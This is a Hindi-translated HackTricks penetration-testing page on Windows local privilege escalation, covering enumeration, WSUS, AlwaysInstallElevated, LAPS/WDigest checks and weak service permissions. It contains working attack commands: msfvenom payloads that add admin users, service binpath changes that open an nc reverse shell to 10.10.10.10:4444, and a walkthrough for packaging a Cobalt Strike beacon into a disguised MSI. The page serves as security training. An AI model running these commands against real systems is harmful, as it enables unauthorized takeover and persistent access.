# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

### प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो आगे बढ़ने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में Integrity Levels क्या हैं, तो आगे बढ़ने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows सुरक्षा नियंत्रण

Windows में कुछ अलग-अलग चीज़ें हैं जो आपको सिस्टम को **prevent you from enumerating the system**, executables चलाने से रोक सकती हैं या यहाँ तक कि आपकी गतिविधियों को **detect your activities** भी कर सकती हैं। आपको privilege escalation enumeration शुरू करने से पहले निम्नलिखित **page** को **read** करना चाहिए और इन सभी **defenses** **mechanisms** को **enumerate** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## सिस्टम जानकारी

### Version info enumeration

जाँचें कि क्या Windows संस्करण में कोई ज्ञात vulnerability है (लागू किए गए patches भी जांचें).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। यह डेटाबेस 4,700 से अधिक security vulnerabilities रखता है, जो एक Windows environment द्वारा प्रस्तुत **massive attack surface** को दर्शाता है।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**स्थानीय रूप से सिस्टम जानकारी के साथ**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### पर्यावरण

क्या कोई credential/Juicy info env variables में सेव है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript फ़ाइलें

इसे चालू करने का तरीका आप इस लिंक पर सीख सकते हैं: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline निष्पादन के विवरण रिकॉर्ड किए जाते हैं, जिनमें executed commands, command invocations, और scripts के हिस्से शामिल होते हैं। हालांकि, पूरी execution विवरण और output results हमेशा कैप्चर नहीं होते हैं।

इसे सक्षम करने के लिए, documentation के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, और **"Module Logging"** को **"Powershell Transcription"** की जगह चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से आखिरी 15 इवेंट्स देखने के लिए आप निम्न कमांड चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की संपूर्ण गतिविधि और पूरी सामग्री का रिकॉर्ड कैप्चर किया जाता है, जिससे यह सुनिश्चित होता है कि कोड का हर ब्लॉक उसके चलने के समय दर्ज किया गया है। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक audit trail बनाकर रखती है, जो forensics और दुष्ट व्यवहार के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों का दस्तावेजीकरण करके प्रक्रिया के बारे में विस्तृत अंतर्दृष्टि प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लॉगिंग इवेंट्स Windows Event Viewer में इस पथ पर मिल सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\ 
आखिरी 20 इवेंट्स देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट्स http**S** के बजाय http के माध्यम से अनुरोधित किए जा रहे हों, तो आप सिस्टम को समझौता कर सकते हैं।

आप यह जाँच करके शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग कर रहा है या नहीं, cmd में निम्नलिखित चलाकर:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी के समान उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

तो, **यह exploitable है।** यदि आखिरी रजिस्ट्री 0 के बराबर है, तो WSUS एंट्री को अनदेखा किया जाएगा।

Exploit करने के लिए आप निम्न टूल्स का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - ये MiTM weaponized exploits scripts हैं जो non-SSL WSUS ट्रैफिक में 'fake' updates इंजेक्ट करते हैं।

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
बुनियादी तौर पर, यह वही flaw है जिसका यह बग फायदा उठाता है:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

आप इस vulnerability का exploit [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) टूल का उपयोग करके कर सकते हैं (जब यह उपलब्ध हो)। 

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई एंटरप्राइज़ एजेंट्स लोकलहोस्ट पर एक IPC सतह और एक privileged update चैनल एक्सपोज़ करते हैं। यदि enrollment को attacker server की तरफ मजबूर किया जा सके और updater किसी rogue root CA या कमजोर signer checks पर भरोसा करता हो, तो एक लोकल यूज़र एक malicious MSI दे सकता है जिसे SYSTEM सर्विस इंस्टॉल कर देती है। एक सामान्यीकृत तकनीक देखें (Netskope stAgentSvc चेन – CVE-2025-0309 पर आधारित) यहाँ:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows **domain** environments में एक **local privilege escalation** vulnerability मौजूद है जब कुछ विशिष्ट शर्तें हों। इन शर्तों में वे एनवायरनमेंट शामिल हैं जहाँ **LDAP signing लागू नहीं है**, यूज़र्स के पास self-rights होते हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** को कॉन्फ़िगर करने की अनुमति देते हैं, और यूज़र्स के पास डोमेन के भीतर कंप्यूटर बनाने की क्षमता होती है। यह ध्यान देने योग्य है कि ये **requirements** डिफ़ॉल्ट सेटिंग्स के साथ पूरी हो जाती हैं।

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

अटैक के फ्लो के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**यदि** ये 2 रजिस्ट्री एंट्रीज़ **सक्रिय** हैं (क़ीमत **0x1**), तो किसी भी privilege के यूज़र्स `*.msi` फाइलों को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास meterpreter session है, तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

power-up से `Write-UserAddMSI` कमांड का उपयोग करके वर्तमान निर्देशिका में विशेषाधिकार बढ़ाने के लिए एक Windows MSI binary बनाएं। यह स्क्रिप्ट एक precompiled MSI installer लिखती है जो user/group addition के लिए prompt करती है (इसलिए आपको GIU access चाहिए):
```
Write-UserAddMSI
```
सिर्फ बनाई गई बाइनरी को चलाकर privileges बढ़ाएँ।

### MSI Wrapper

इस ट्यूटोरियल को पढ़ें ताकि आप इन टूल्स का उपयोग करके एक MSI wrapper बनाना सीख सकें। ध्यान रखें कि अगर आप केवल **execute** **command lines** करना चाहते हैं तो आप एक **.bat** फ़ाइल को wrap कर सकते हैं।


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** Cobalt Strike या Metasploit के साथ `C:\privesc\beacon.exe` में एक **new Windows EXE TCP payload** बनाएं।
- **Visual Studio** खोलें, **Create a new project** चुनें और search बॉक्स में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट का नाम दें, जैसे **AlwaysPrivesc**, location के लिए **`C:\privesc`** का उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) पर न पहुँच जाएँ। **Add** पर क्लिक करें और अभी जनरेट किया गया Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो इंस्टॉल किए गए ऐप को अधिक विश्वसनीय दिखा सकती हैं।
- प्रोजेक्ट पर राइट-क्लिक करें और **View > Custom Actions** चुनें।
- **Install** पर राइट-क्लिक करें और **Add Custom Action** चुनें।
- **Application Folder** पर डबल-क्लिक करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। इससे सुनिश्चित होगा कि installer रन होते ही beacon payload execute हो जाएगा।
- **Custom Action Properties** के अंतर्गत **Run64Bit** को **True** में बदलें।
- अंत में, **build it**।
- अगर यह warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

दुर्भावनापूर्ण `.msi` फ़ाइल की **इंस्टॉलेशन** को बैकग्राउंड में चलाने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
To exploit this vulnerability you can use: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर्स

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **logged** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जा रहे हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** का उद्देश्य **local Administrator passwords** के प्रबंधन के लिए बनाया गया है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड **अद्वितीय, यादृच्छिक, और नियमित रूप से अपडेट** किया जाता है उन कंप्यूटरों पर जो किसी domain से जुड़े हों। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त अनुमति प्रदान की गई हो, जिससे अधिकृत होने पर उन्हें local admin passwords देखने की अनुमति मिलती है।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, तो **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अनविश्वसनीय प्रक्रियाओं द्वारा इसकी मेमोरी पढ़ने या कोड इंजेक्ट करने के प्रयासों को **रोक** सके, जिससे सिस्टम और अधिक सुरक्षित हो गया है।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसी खतरों से सुरक्षित रखना है.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम घटकों द्वारा उपयोग में लाया जाता है। जब किसी उपयोगकर्ता के logon data को किसी registered security package द्वारा प्रमाणित किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित किए जाते हैं।\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता & समूह

### उपयोगकर्ता और समूह की सूची

आपको यह जांचना चाहिए कि आप जिन समूहों के सदस्य हैं, उनमें किसी के पास कोई उपयोगी permissions तो नहीं हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

यदि आप किसी **privileged group** के सदस्य हैं तो आप **escalate privileges** कर सकते हैं। Privileged groups के बारे में और उन्हें abuse करके कैसे escalate privileges किया जा सकता है, यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Learn more** इस पेज पर कि **token** क्या है: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पेज देखें ताकि आप **interesting tokens** और उन्हें कैसे abuse किया जा सकता है, सीख सकें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे प्रोसेस

### फाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रोसेस सूचीबद्ध करते समय **प्रोसेस की command line के अंदर पासवर्ड की जाँच करें**.\
जाँच करें कि आप **overwrite some binary running** कर सकते हैं या क्या आपके पास binary फ़ोल्डर की write permissions हैं ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठाया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा जांचें कि [**electron/cef/chromium debuggers** चल तो नहीं रहे — आप इसका दुरुपयोग करके escalate privileges कर सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**प्रोसेस बाइनरीज़ की अनुमतियाँ जाँचना**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फोल्डरों की अनुमतियों की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप sysinternals के **procdump** का उपयोग करके किसी running process का memory dump बना सकते हैं। FTP जैसी services में अक्सर **credentials in clear text in memory** होते हैं — memory dump करके credentials पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI एप्लिकेशन

**SYSTEM के रूप में चलने वाले एप्लिकेशन उपयोगकर्ता को CMD खोलने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## सेवाएं

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप **sc** का उपयोग किसी सेवा की जानकारी प्राप्त करने के लिए कर सकते हैं।
```bash
sc qc <service_name>
```
यह अनुशंसा की जाती है कि प्रत्येक सेवा के लिए आवश्यक privilege स्तर की जाँच करने हेतु _Sysinternals_ का binary **accesschk** उपलब्ध हो।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह सलाह दी जाती है कि जाँचें कि "Authenticated Users" किसी भी service को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[यहाँ से आप accesschk.exe (XP के लिए) डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे निम्न का उपयोग करके सक्षम कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान में रखें कि service upnphost SSDPSRV पर काम करने के लिए निर्भर करता है (XP SP1 के लिए)**

**Another workaround** इस समस्या का एक तरीका है कि आप निम्नलिखित चलाएँ:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

यदि किसी सेवा पर "Authenticated users" समूह के पास **SERVICE_ALL_ACCESS** है, तो उस सेवा के निष्पादन योग्य बाइनरी को संशोधित करना संभव है। **sc** को संशोधित और निष्पादित करने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
अधिकार (Privileges) विभिन्न permissions के माध्यम से escalate किए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: सेवा बाइनरी की पुन: कॉन्फ़िगरेशन की अनुमति देता है।
- **WRITE_DAC**: अनुमतियों को पुन: कॉन्फ़िगर करने में सक्षम बनाता है, जिससे सेवा विन्यास बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: स्वामित्व हासिल करने और अनुमतियों को पुन: कॉन्फ़िगर करने की अनुमति देता है।
- **GENERIC_WRITE**: सेवा विन्यास बदलने की क्षमता प्रदान करता है।
- **GENERIC_ALL**: भी सेवा विन्यास बदलने की क्षमता प्रदान करता है।

इस भेद्यता का पता लगाने और इसका शोषण करने के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries weak permissions

**जाँचें कि क्या आप उस बाइनरी को संशोधित कर सकते हैं जिसे कोई service execute करता है** या यदि आपके पास **write permissions on the folder** है जहाँ बाइनरी स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप किसी service द्वारा execute की जाने वाली हर बाइनरी को **wmic** (system32 में नहीं) से प्राप्त कर सकते हैं और अपनी अनुमतियाँ **icacls** से जाँच सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry को modify करने की permissions

आपको यह जांचना चाहिए कि क्या आप किसी भी service registry को modify कर सकते हैं।  
आप अपने **permissions** को किसी service **registry** पर **check** कर सकते हैं, इसके लिए:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जांचना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं। यदि ऐसा है, तो सर्विस द्वारा चलाई जाने वाली binary को बदला जा सकता है।

चलाई जाने वाली binary के Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इस registry से sub registries बना सकते हैं**। Windows services के मामले में यह **arbitrary code execute करने के लिए पर्याप्त** है:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes में नहीं है, तो Windows space से पहले वाले प्रत्येक हिस्से को execute करने की कोशिश करेगा।

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
बिल्ट-इन Windows सेवाओं से संबंधित सेवाओं को छोड़कर सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability का पता लगा सकते हैं और exploit कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप मैन्युअली metasploit के साथ एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

